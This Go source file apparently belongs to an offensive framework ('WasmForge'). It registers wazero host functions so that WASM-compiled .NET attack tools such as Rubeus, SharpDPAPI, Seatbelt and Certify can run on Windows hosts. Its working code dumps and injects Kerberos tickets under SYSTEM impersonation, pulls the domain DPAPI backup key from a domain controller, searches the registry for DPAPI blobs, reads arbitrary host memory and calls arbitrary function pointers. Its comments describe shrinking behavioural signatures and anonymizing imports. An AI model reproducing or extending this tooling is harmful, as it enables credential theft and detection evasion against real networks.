//go:build nativeaot

// NativeAOT-specific host functions for .NET NativeAOT-WASI modules.
// These functions are ONLY registered when the "nativeaot" build tag is active.
// Standard Go WASM builds (wasmforge build) exclude these entirely to minimize
// binary size and attack surface for behavioral signatures.
//
// Included functions:
//   - win32_get_sddl: SDDL retrieval (GetNamedSecurityInfoW + ConvertToSddl)
//   - win32_enum_user_rights: LSA user right enumeration
//   - win32_enum_rpc_endpoints: RPC endpoint mapping
//   - win32_wmi_query: WMI queries via native COM
//   - os_list_dir: Host directory listing (bypasses WASI path mapping)
//   - os_file_exists: Host file existence check (bypasses WASI path mapping)
//
// C bridge compatibility shims (override Go-signature registrations):
//   - mod_load: (i32 name_ptr) → i32   null-terminated DLL name, returns handle
//   - mod_resolve: (i32 lib_handle, i32 name_ptr) → i32   null-terminated proc name, returns handle
//   - mod_invoke: (i64×17, i32×2) → i64   inline args, returns r0 directly

package hostmod

import (
	"context"
	"encoding/binary"
	"unsafe"

	"github.com/tetratelabs/wazero"
	"github.com/tetratelabs/wazero/api"
)

// registerNativeAOTFunctions registers host functions specific to NativeAOT-WASI
// (.NET) guest modules. These provide WMI, SDDL, LSA, RPC, and filesystem access
// that NativeAOT guests need but Go WASM guests do not.
func registerNativeAOTFunctions(b wazero.HostModuleBuilder) wazero.HostModuleBuilder {
	return b.
		// win32_parse_sddl_acl export removed — WASM-side via pinvoke_env_ext.c
		// sec_parsesddl now does a raw-SDDL passthrough; richer parsing can
		// be added later with wf_call(advapi32!ConvertStringSDtoSD + GetAce).

		// win32_get_sddl export removed — WASM-side via wf_call
		// (advapi32!GetNamedSecurityInfoW + Convert SD to string) in pinvoke_env_ext.c.

		// win32_enum_user_rights / win32_enum_logon_sessions exports removed —
		// WASM-side stubs in pinvoke_env_ext.c; full LSA chains via wf_call later.

		// win32_enum_rpc_endpoints export removed — WASM-side stub in
		// pinvoke_env_ext.c. Full RpcMgmtEpEltInq chain via wf_call to follow.

		// win32_wmi_query / win32_wmi_method exports removed — WASM-side
		// stubs in pinvoke_env_ext.c; full WMI COM chain via WfCom +
		// wf_call_ptr to follow.

		// os_list_dir / os_file_exists / os_read_all exports removed —
		// implemented WASM-side via wf_call(kernel32.dll) FindFirstFileW /
		// GetFileAttributesW / CreateFileW chains. Host no longer touches
		// the filesystem on the payload's behalf.

		// win32_check_modifiable_key / win32_check_modifiable_service exports
		// removed — WASM-side via wf_call against RegOpenKeyExW(KEY_WRITE) /
		// OpenSCManagerW+OpenServiceW(SERVICE_CHANGE_CONFIG) in pinvoke_env_ext.c.

		// win32_enum_process_modules export removed — WASM-side via wf_call
		// (kernel32.dll!CreateToolhelp32Snapshot + Module32W chain) in
		// pinvoke_env_ext.c. Same template as proc_modules_all.

		// win32_enum_network_adapters export removed — WASM-side via wf_call
		// (iphlpapi.dll!GetAdaptersInfo) in pinvoke_env_ext.c.

		// win32_get_file_version_info export removed — WASM-side via wf_call
		// (version.dll!GetFileVersionInfoSize/InfoW + VerQueryValueW chain)
		// in pinvoke_env_ext.c.

		// win32_enum_reg_values export removed — WASM-side via wf_call
		// (advapi32!RegEnumValueW chain) in pinvoke_env_ext.c.

		// win32_lsa_kerberos_op: op_ptr, op_len, luid_low, luid_high, out_buf_ptr, out_buf_len → bytes_written
		// Reinstated 2026-06-01. The earlier "WASM-side via wf_call" plan
		// stubbed WfLsaKerberosOp in pinvoke_env_ext.c to return 0, which
		// silently broke every Rubeus LSA verb (klist/dump/ptt/purge).
		// The host implementation in nativeaot_security_windows.go runs
		// the full LSA chain on a locked OS thread with SYSTEM
		// impersonation — the only place that sequence is reliable.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			opPtr := api.DecodeU32(stack[0])
			opLen := api.DecodeU32(stack[1])
			luidLow := api.DecodeU32(stack[2])
			luidHigh := api.DecodeU32(stack[3])
			outBufPtr := api.DecodeU32(stack[4])
			outBufLen := api.DecodeU32(stack[5])
			stack[0] = uint64(win32LsaKerberosOp(ctx, mod, opPtr, opLen, luidLow, luidHigh, outBufPtr, outBufLen))
		}), []api.ValueType{
			api.ValueTypeI32, api.ValueTypeI32,
			api.ValueTypeI32, api.ValueTypeI32,
			api.ValueTypeI32, api.ValueTypeI32,
		}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("op_ptr", "op_len", "luid_low", "luid_high", "out_buf_ptr", "out_buf_len").
		Export(export("win32_lsa_kerberos_op")).

		// win32_crypto_op (NativeAOT): op_ptr, op_len, args_ptr, args_len,
		//   out_ptr, out_cap → bytes written
		//
		// Generic crypto dispatcher. Single host export that absorbs the
		// looped-crypto cases (MS-PBKDF2, etc.) that would otherwise pay
		// per-iteration WASM↔host boundary cost. Opcode is a short ASCII
		// string (e.g. "mspbkdf2_512"); args are length-prefixed byte
		// fields packed into a single WASM buffer.
		//
		// See nativeaotCryptoOp docstring in
		// internal/hostmod/nativeaot_crypto_windows.go for the full
		// opcode catalog + wire format.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			opPtr := api.DecodeU32(stack[0])
			opLen := api.DecodeU32(stack[1])
			argsPtr := api.DecodeU32(stack[2])
			argsLen := api.DecodeU32(stack[3])
			outPtr := api.DecodeU32(stack[4])
			outCap := api.DecodeU32(stack[5])
			stack[0] = uint64(nativeaotCryptoOp(ctx, mod, opPtr, opLen, argsPtr, argsLen, outPtr, outCap))
		}), []api.ValueType{
			api.ValueTypeI32, api.ValueTypeI32,
			api.ValueTypeI32, api.ValueTypeI32,
			api.ValueTypeI32, api.ValueTypeI32,
		}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("op_ptr", "op_len", "args_ptr", "args_len", "out_ptr", "out_cap").
		Export(export("win32_crypto_op")).

		// win32_io_op (NativeAOT): op_ptr, op_len, args_ptr, args_len,
		//   out_ptr, out_cap → bytes written
		//
		// Sibling to xc_op for filesystem operations. Single wf_call per
		// file read instead of the 6-8 wf_call CreateFile+ReadFile+Close
		// chain in the WASM bridge. Empirically reduces per-file cost
		// from ~46 ms to <1 ms.
		//
		// Opcodes: "read", "stat", "list" — see nativeaotIoOp docstring
		// in internal/hostmod/nativeaot_os.go.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			opPtr := api.DecodeU32(stack[0])
			opLen := api.DecodeU32(stack[1])
			argsPtr := api.DecodeU32(stack[2])
			argsLen := api.DecodeU32(stack[3])
			outPtr := api.DecodeU32(stack[4])
			outCap := api.DecodeU32(stack[5])
			stack[0] = uint64(nativeaotIoOp(ctx, mod, opPtr, opLen, argsPtr, argsLen, outPtr, outCap))
		}), []api.ValueType{
			api.ValueTypeI32, api.ValueTypeI32,
			api.ValueTypeI32, api.ValueTypeI32,
			api.ValueTypeI32, api.ValueTypeI32,
		}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("op_ptr", "op_len", "args_ptr", "args_len", "out_ptr", "out_cap").
		Export(export("win32_io_op")).

		// win32_reg_search (NativeAOT): hive, out_buf_ptr, out_buf_cap → bytes written
		//
		// Host-side BFS walker for SharpDPAPI's `search` verb. Category C
		// (atomic composite): a fresh wf_call per visited registry key is
		// O(depth) per call and exceeds the lab's 5-minute exec budget on
		// HKLM (~500K keys). Doing the BFS host-side uses parent-handle
		// propagation at native Win32 speed (RegOpenKeyEx(parent, child,
		// …) — no full-path lookup per key) and completes both hives in
		// seconds.
		//
		// Wire format: NUL-separated UTF-8 records in the output buffer.
		// First record is "Root: <prefix>\" matching native's
		// Console.WriteLine("Root: " + root); subsequent records are
		// match lines "<prefix>\\<subpath> ! <valueName>" (with the
		// double backslash that .NET RegistryKey.Name produces when the
		// root was opened as OpenSubKey("\\")).
		//
		// See nativeaotRegSearch in
		// internal/hostmod/nativeaot_regsearch_windows.go for the
		// detection logic (matches SharpDPAPI's dpapiBlobSearches + the
		// 4-string base64/hex regex alternation byte-for-byte).
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			nativeaotRegSearch(ctx, mod, stack)
		}), []api.ValueType{
			api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32,
		}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("hive", "out_buf_ptr", "out_buf_cap").
		Export(export("win32_reg_search")).

		// win32_dpapi_backupkey (NativeAOT): server_ptr, server_len,
		//   out_buf_ptr, out_buf_cap → bytes written
		//
		// Host-side DsGetDcNameW + LsaOpenPolicy + 2× LsaRetrievePrivateData
		// chain for SharpDPAPI's `backupkey` verb. Category C — both
		// LSA APIs and DsGetDcName return host pointers via OUT parameters
		// that Marshal.PtrToStructure dereferences on the wasm32 caller
		// (IntPtr is 32-bit; the host pointer is 64-bit → truncation +
		// OOB trap). Running the chain end-to-end on the host returns
		// only materialised byte payloads.
		//
		// Wire format: see writeBackupKeyReply in
		// internal/hostmod/nativeaot_backupkey_windows.go — packed
		// (status u32, dc_name length-prefixed, guid length-prefixed,
		// key_blob length-prefixed).
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			nativeaotDpapiBackupkey(ctx, mod, stack)
		}), []api.ValueType{
			api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32,
		}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("server_ptr", "server_len", "out_buf_ptr", "out_buf_cap").
		Export(export("win32_dpapi_backupkey")).

		// win32_x509_match (NativeAOT): modulus_ptr, modulus_len,
		//   out_buf_ptr, out_buf_cap → bytes written
		//
		// Host-side X.509 store walker for SharpDPAPI's machinetriage cert
		// matching path. Native walks CurrentUser + LocalMachine MY stores,
		// asking each cert for its public-key XML and substring-matching
		// against a private-key XML derived from the decrypted blob.
		//
		// On wasm32 the whole chain (X509Store / X509Certificate2 /
		// cert.PublicKey.Key.ToXmlString) throws PlatformNotSupportedException
		// in System.Security.Cryptography. This bridge takes the raw
		// modulus bytes from the C# caller (extracted by manual byte
		// slicing of the decrypted RSA blob — no crypto calls on C# side),
		// walks both stores via golang.org/x/sys/windows's CertEnumCertificatesInStore,
		// parses each cert's SubjectPublicKeyInfo via crypto/x509, compares
		// moduli, and on match returns the cert metadata + raw DER for
		// PEM wrapping on the C# side.
		//
		// See nativeaotX509Match in
		// internal/hostmod/nativeaot_x509match_windows.go for the wire
		// format (status u32, 7 length-prefixed records).
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			nativeaotX509Match(ctx, mod, stack)
		}), []api.ValueType{
			api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32,
		}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("modulus_ptr", "modulus_len", "out_buf_ptr", "out_buf_cap").
		Export(export("win32_x509_match")).

		// ── POSIX compatibility stubs for wasip2 sysroot ──────────────────
		// NativeAOT-WASI linked with wasip2 sysroot imports these POSIX
		// functions from "env". They use original names (not anonymized)
		// because they come from the C standard library, not the WasmForge
		// bridge.

		// pthread_self: () → i32 — return fake thread ID (single-threaded WASM)
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, stack []uint64) {
			stack[0] = 1 // fake thread ID
		}), nil, []api.ValueType{api.ValueTypeI32}).
		Export("pthread_self").

		// pthread_mutex_lock: (i32) → i32 — no-op, return 0 (success)
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, stack []uint64) {
			stack[0] = 0
		}), []api.ValueType{api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		Export("pthread_mutex_lock").

		// pthread_mutex_unlock: (i32) → i32 — no-op, return 0 (success)
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, stack []uint64) {
			stack[0] = 0
		}), []api.ValueType{api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		Export("pthread_mutex_unlock").

		// gai_strerror: (i32) → i32 — return pointer to empty string in WASM memory
		// Writes a NUL byte at a fixed scratch address and returns it.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, mod api.Module, stack []uint64) {
			// Write NUL at address 16 (safe scratch area above NULL page)
			mod.Memory().WriteByte(16, 0)
			stack[0] = 16
		}), []api.ValueType{api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		Export("gai_strerror").

		// getaddrinfo: (node, service, hints, res) → i32 — return EAI_FAIL (-1)
		// NativeAOT .NET uses Win32 APIs for networking, not POSIX sockets.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, stack []uint64) {
			stack[0] = ^uint64(0) // -1 (EAI_FAIL)
		}), []api.ValueType{api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		Export("getaddrinfo").

		// freeaddrinfo: (i32) → void — no-op
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, _ []uint64) {}),
			[]api.ValueType{api.ValueTypeI32}, nil).
		Export("freeaddrinfo").

		// setsockopt: (fd, level, optname, optval, optlen) → i32 — return -1 (ENOSYS)
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, stack []uint64) {
			stack[0] = ^uint64(0) // -1
		}), []api.ValueType{api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		Export("setsockopt").

		// socket: (domain, type, protocol) → i32 — return -1 (ENOSYS)
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(_ context.Context, _ api.Module, stack []uint64) {
			stack[0] = ^uint64(0) // -1
		}), []api.ValueType{api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		Export("socket").

		// win32_tcp_send_recv retired — WfTcpSendRecv in pinvoke_nativeaot.c
		// now uses wf_sock_* primitives (fd_open/fd_connect/fd_read2/fd_write2/
		// fd_close2/addr_resolve) directly; no env import needed.

		// ── Phase-B Wf bridge stubs ─────────────────────────────────────────
		// The Certify/Rubeus/Seatbelt wf_bridge.h declares several env imports
		// (wmi_query, fs_*, reg_modifiable, etc.) whose host counterparts were
		// removed during the Phase-B "WASM-side via wf_call" migration. The
		// bridge still references them at link time via pinvoke_env_ext.c
		// wrappers, so the WASM loader requires them to be exported by the
		// host module even if the wrappers are never called at runtime.
		// Each stub returns 0 (no bytes / no match) so callers see a clean
		// "operation succeeded but produced nothing" path.
		//
		// ── C bridge compatibility shims ─────────────────────────────────────
		// The NativeAOT C bridge (wf_bridge.h) declares mod_load, mod_resolve,
		// and mod_invoke with different signatures than the Go WASM bridge.
		// These shims override the Go-signature registrations (wazero's builder
		// uses last-write-wins semantics) so that NativeAOT guests resolve their
		// imports correctly.

		// mod_load (NativeAOT): name_ptr → handle
		//
		// C bridge signature: uint32_t wf_load_library(uint32_t name_ptr)
		//   name_ptr: WASM address of a null-terminated DLL name (no length arg)
		//   returns: handle table entry (>0), or 0 on failure
		//
		// Shim: scan for NUL terminator to recover nameLen, write handle to a
		// scratch WASM slot, then forward to win32LoadLibrary.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			namePtr := api.DecodeU32(stack[0])
			stack[0] = uint64(nativeaotLoadLibrary(ctx, mod, namePtr))
		}), []api.ValueType{api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("name_ptr").
		Export(export("win32_load_library")).

		// mod_resolve (NativeAOT): lib_handle, name_ptr → handle
		//
		// C bridge signature: uint32_t wf_get_proc_address(uint32_t lib_handle, uint32_t name_ptr)
		//   lib_handle: handle from mod_load
		//   name_ptr: WASM address of a null-terminated function name (no length arg)
		//   returns: handle table entry (>0), or 0 on failure
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			libHandle := int32(stack[0])
			namePtr := api.DecodeU32(stack[1])
			stack[0] = uint64(nativeaotGetProcAddress(ctx, mod, libHandle, namePtr))
		}), []api.ValueType{api.ValueTypeI32, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("lib_handle", "name_ptr").
		Export(export("win32_get_proc_address")).

		// mod_invoke (NativeAOT): proc_handle, nargs, a0..a14, ret1_ptr, err_ptr → r0
		//
		// C bridge signature (from wf_bridge.h):
		//   uint64_t wf_mod_invoke(uint64_t proc_handle, uint32_t nargs,
		//       uint64_t a0..a14,
		//       uint64_t ret1_ptr, uint64_t err_ptr)
		//   returns: r0 (the Win32 API return value)
		//
		// Stack layout (19 elements, all uint64 slots):
		//   [0]  proc_handle (i64)
		//   [1]  nargs       (i32 in i64 slot)
		//   [2..16] a0..a14  (i64 each)
		//   [17] ret1_ptr    (i64 containing i32 WASM address)
		//   [18] err_ptr     (i64 containing i32 WASM address)
		//
		// The shim writes the 15 inline args to a scratch region in WASM memory,
		// calls win32SyscallN (which handles pointer translation, shadow memory,
		// mirror table, COM dispatch, and async yield), then reads r0 back from
		// ret1_ptr and returns it directly.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			stack[0] = uint64(nativeaotModInvoke(ctx, mod, stack))
		}), []api.ValueType{
			api.ValueTypeI64,                                                                                                                  // proc_handle
			api.ValueTypeI32,                                                                                                                  // nargs
			api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64,                                          // a0..a4
			api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64,                                          // a5..a9
			api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64, api.ValueTypeI64,                                          // a10..a14
			api.ValueTypeI64,                                                                                                                  // ret1_ptr
			api.ValueTypeI64,                                                                                                                  // err_ptr
		}, []api.ValueType{api.ValueTypeI64}).
		WithParameterNames("proc_handle", "nargs",
			"a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7",
			"a8", "a9", "a10", "a11", "a12", "a13", "a14",
			"ret1_ptr", "err_ptr").
		Export(export("win32_syscalln")).

		// win32_register_funcptr: register a raw host function pointer as a
		// synthetic proc handle with an explicit per-arg pointer mask.
		//
		// C bridge signature:
		//   uint32_t wf_register_funcptr(uint64_t funcptr, uint32_t ptr_mask)
		//
		// Returns a handle table entry (>0) that can be passed to mod_invoke
		// as the proc_handle, or 0 on failure. The pointer mask bit N=1 means
		// arg[N] is a WASM pointer that the host should translate to a host
		// address; bit N=0 means it is a handle/scalar/size to pass through
		// unchanged. This unblocks COM vtable dispatch (each method has a
		// different signature, so the bridge can't auto-derive the mask).
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			funcptr := stack[0]
			ptrMask := uint32(stack[1])
			stack[0] = uint64(nativeaotRegisterFuncptr(ctx, mod, funcptr, ptrMask))
		}), []api.ValueType{api.ValueTypeI64, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("funcptr", "ptr_mask").
		Export(export("win32_register_funcptr")).

		// Raw host-memory read. Reads `len` bytes from arbitrary host
		// address (passed as 64-bit value) into WASM memory at outPtr.
		// Returns 0 on success, errno on failure.
		//
		// Unblocks Marshal.ReadInt32/PtrToStructure patterns where a
		// Win32 API wrote an 8-byte host pointer into an out parameter
		// and the WASM mirror Step 6 didn't catch it (e.g., deeply
		// nested struct chains in wlanapi, winspool, netapi32).
		//
		// C bridge signature:
		//   uint32_t wf_host_read_bytes(uint64_t host_addr,
		//                               uint32_t len,
		//                               void* out_buf)
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			hostAddr := stack[0]
			length := uint32(stack[1])
			outPtr := uint32(stack[2])
			stack[0] = uint64(nativeaotHostReadBytes(ctx, mod, hostAddr, length, outPtr))
		}), []api.ValueType{api.ValueTypeI64, api.ValueTypeI32, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("host_addr", "len", "out_ptr").
		Export(export("win32_host_read_bytes")).

		// win32_reg_enum_values retired 2026-06-08: Seatbelt.wasm + Rubeus.wasm
		// both resolve reg_enumvals locally (live-import-probe verified). The
		// composite advapi32!RegOpenKeyExW + RegEnumValueW + RegCloseKey chain
		// now runs entirely WASM-side via pinvoke_env_ext.c wf_call sequences.
		// If a future consumer re-imports the env name, restore from history.

		// win32_wmi_query_restricted: queryPtr, queryLen, nsPtr, nsLen, outBufPtr, outBufLen → bytes_written
		// Identical to win32WmiQuery but registered under the name "wmi_query_r" so
		// C# WfWmi.QueryRestricted can call it via a separate DllImport. The host-side
		// implementation always calls CoSetProxyBlanket on the IWbemServices proxy
		// (inside wmiQueryJSON → ComRunOnSTA), making it safe for restricted WMI
		// namespaces (root\SecurityCenter2, ROOT\Subscription) that fire IUnknown
		// callbacks during ConnectServer. Those callbacks never cross the WASM FFI
		// boundary — they execute entirely on the host COM STA thread.
		NewFunctionBuilder().
		WithGoModuleFunction(api.GoModuleFunc(func(ctx context.Context, mod api.Module, stack []uint64) {
			queryPtr := uint32(stack[0])
			queryLen := uint32(stack[1])
			nsPtr := uint32(stack[2])
			nsLen := uint32(stack[3])
			outBufPtr := uint32(stack[4])
			outBufLen := uint32(stack[5])
			stack[0] = uint64(win32WmiQuery(ctx, mod, queryPtr, queryLen, nsPtr, nsLen, outBufPtr, outBufLen))
		}), []api.ValueType{api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32, api.ValueTypeI32}, []api.ValueType{api.ValueTypeI32}).
		WithParameterNames("query_ptr", "query_len", "ns_ptr", "ns_len", "out_buf_ptr", "out_buf_len").
		Export(export("win32_wmi_query_restricted"))

	// win32_kerberos_{hash,encrypt,decrypt,checksum} retired — WfKerberos*
		// functions in pinvoke_nativeaot.c now implement these directly via
		// BCrypt wf_call chains (hash) and CDLocateCSystem + wf_call_ptr_fixed8
		// (enc/dec/cksum); no env imports needed.

	// os_list_named_pipes / os_enum_printers / os_enum_sec_packages /
	// os_enum_user_right_assignments / os_enum_wifi_profiles exports
	// removed — WASM-side in pinvoke_env_ext.c (fs_pipes via wf_call to
	// kernel32!FindFirstFileW; others stub-empty pending wf_call_v2
	// chain expansion).
}

// nativeaotHostReadBytes reads `length` bytes from arbitrary host memory
// at the given uintptr address and writes them to the WASM buffer at
// outPtr. Used by C# helpers to dereference host pointers that escaped
// the recursive mirror pass.
//
// Safety: dereferencing an attacker-controlled host pointer is unsafe.
// We at least validate the basics (non-null, length > 0, length <= 4 KB
// to avoid catastrophic reads). For Marshal.ReadInt32-style use cases
// length is typically 4 or 8 bytes.
func nativeaotHostReadBytes(ctx context.Context, mod api.Module, hostAddr uint64, length, outPtr uint32) uint32 {
	if hostAddr == 0 || length == 0 || length > 4096 {
		return errnoEINVAL
	}
	cfg := getConfig(ctx)
	if cfg == nil {
		return errnoENOSYS
	}
	mem := mod.Memory()
	if mem == nil {
		return errnoEFAULT
	}
	// Convert host address to unsafe pointer and copy bytes.
	defer func() {
		// Catch any segfault in the dereference.
		_ = recover()
	}()
	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(uintptr(hostAddr))), length)
	if !mem.Write(outPtr, srcSlice) {
		return errnoEFAULT
	}
	return errnoSuccess
}

// nativeaotRegisterFuncptr creates a synthetic handleProc entry for an
// arbitrary host function pointer with an explicit pointer mask. Used by
// the NativeAOT-WASI C bridge to dispatch through COM vtables (each vtable
// slot is a raw host funcptr that has no DLL+name backing).
//
// The returned handle is valid for the lifetime of the WASM session — it
// behaves identically to a handle returned by GetProcAddress, except the
// debugName is generic and the pointer mask is caller-supplied.
func nativeaotRegisterFuncptr(ctx context.Context, mod api.Module, funcptr uint64, ptrMask uint32) uint32 {
	ht := getWin32Handles(ctx)
	if ht == nil || funcptr == 0 {
		return 0
	}
	procAddr := uintptr(funcptr)
	// If the caller passed a WASM mirror address (e.g. a COM vtable slot
	// that was recursively mirrored), reverse-translate to the original
	// host funcptr. Without this, mod_invoke → syscall.SyscallN would
	// jump into WASM linear memory and crash with EXCEPTION_ACCESS_VIOLATION.
	if mt := getMirrorTable(ctx); mt != nil {
		if me := mt.LookupByWasm(uint32(funcptr)); me != nil {
			offset := uint32(funcptr) - me.wasmAddr
			procAddr = me.hostAddr + uintptr(offset)
		} else if hostAddr, ok := mt.LookupPendingByWasm(uint32(funcptr)); ok {
			procAddr = hostAddr
		}
	}
	entry := &win32HandleEntry{
		kind:           handleProc,
		procAddr:       procAddr,
		debugName:      "wf_funcptr",
		hasPointerMask: true,
		pointerMask:    ptrMask,
	}
	return uint32(ht.register(entry))
}

// nativeaotCStringLen returns the byte length of a null-terminated C string in
// WASM memory, or 0 if the string is empty or the memory read fails.
// Scans at most maxLen bytes to guard against runaway strings.
func nativeaotCStringLen(mod api.Module, ptr uint32) uint32 {
	const maxLen = 512
	mem := mod.Memory()
	if mem == nil {
		return 0
	}
	for i := uint32(0); i < maxLen; i++ {
		b, ok := mem.ReadByte(ptr + i)
		if !ok {
			return 0
		}
		if b == 0 {
			return i
		}
	}
	return maxLen
}

// nativeaotLoadLibrary implements the NativeAOT C bridge mod_load shim.
// Signature: (name_ptr uint32) → handle uint32
// Returns the handle table entry on success, 0 on failure.
func nativeaotLoadLibrary(ctx context.Context, mod api.Module, namePtr uint32) uint32 {
	nameLen := nativeaotCStringLen(mod, namePtr)
	if nameLen == 0 {
		return 0
	}
	// Use a scratch WASM address to receive the handle from win32LoadLibrary.
	const scratchAddr = 256 // 4-byte scratch slot well below any real allocation.
	errno := win32LoadLibrary(ctx, mod, namePtr, nameLen, scratchAddr)
	if errno != errnoSuccess {
		return 0
	}
	handle, ok := readUint32(mod, scratchAddr)
	if !ok {
		return 0
	}
	return handle
}

// nativeaotGetProcAddress implements the NativeAOT C bridge mod_resolve shim.
// Signature: (lib_handle int32, name_ptr uint32) → handle uint32
// Returns the handle table entry on success, 0 on failure.
func nativeaotGetProcAddress(ctx context.Context, mod api.Module, libHandle int32, namePtr uint32) uint32 {
	nameLen := nativeaotCStringLen(mod, namePtr)
	if nameLen == 0 {
		return 0
	}
	// Use a scratch WASM address to receive the proc handle from win32GetProcAddress.
	const scratchAddr = 260 // 4-byte scratch slot adjacent to nativeaotLoadLibrary's.
	errno := win32GetProcAddress(ctx, mod, libHandle, namePtr, nameLen, scratchAddr)
	if errno != errnoSuccess {
		return 0
	}
	handle, ok := readUint32(mod, scratchAddr)
	if !ok {
		return 0
	}
	return handle
}

// nativeaotModInvoke implements the NativeAOT C bridge mod_invoke shim.
// Signature: see wf_bridge.h wf_mod_invoke.
// Returns r0 (the Win32 API return value) directly as uint64.
//
// The stack layout expected by wazero matches the WASM function type declared in
// registerNativeAOTFunctions: [proc_handle, nargs, a0..a14, ret1_ptr, err_ptr].
func nativeaotModInvoke(ctx context.Context, mod api.Module, stack []uint64) uint64 {
	procHandle := int32(stack[0]) // low 32 bits of i64 proc_handle
	nargs := int32(stack[1])
	ret1Ptr := uint32(stack[17]) // low 32 bits of i64 ret1_ptr
	errPtr := uint32(stack[18])  // low 32 bits of i64 err_ptr

	// Write the 15 inline args (a0..a14) into a scratch region in WASM memory
	// as an int64 array so win32SyscallN can read them via its argsPtr path.
	// WASM is single-threaded; scratch at a fixed low address is safe.
	const argsAddr = 64 // 15 * 8 = 120 bytes → occupies [64, 184).
	mem := mod.Memory()
	if mem == nil {
		return 0
	}
	var argBuf [15 * 8]byte
	maxArgs := int32(15)
	if nargs < maxArgs {
		maxArgs = nargs
	}
	for i := int32(0); i < maxArgs; i++ {
		binary.LittleEndian.PutUint64(argBuf[i*8:(i+1)*8], stack[2+i])
	}
	if !mem.Write(argsAddr, argBuf[:maxArgs*8]) {
		return 0
	}

	// Provide a dummy ret2Ptr (win32SyscallN writes r2 there; NativeAOT doesn't use it).
	// Use a scratch slot that won't conflict with argsAddr or the scratchAddr slots.
	const ret2ScratchAddr = 192 // 8-byte slot at [192, 200).

	errno := win32SyscallN(ctx, mod, procHandle, nargs, argsAddr, ret1Ptr, ret2ScratchAddr, errPtr)
	if errno == errnoYIELD {
		// Cooperative yield: signal the guest to retry.
		// Pack errnoYIELD into a recognisable sentinel that the C bridge can check.
		// The C bridge checks err_ptr after the call, so write errnoYIELD there too.
		_ = writeUint32(mod, errPtr, errnoYIELD)
		return 0
	}

	// Read r0 back from ret1Ptr (win32SyscallN writes r1 there as a uint64).
	if ret1Ptr == 0 {
		return 0
	}
	r0Bytes, ok := readBytes(mod, ret1Ptr, 8)
	if !ok {
		return 0
	}
	return binary.LittleEndian.Uint64(r0Bytes)
}

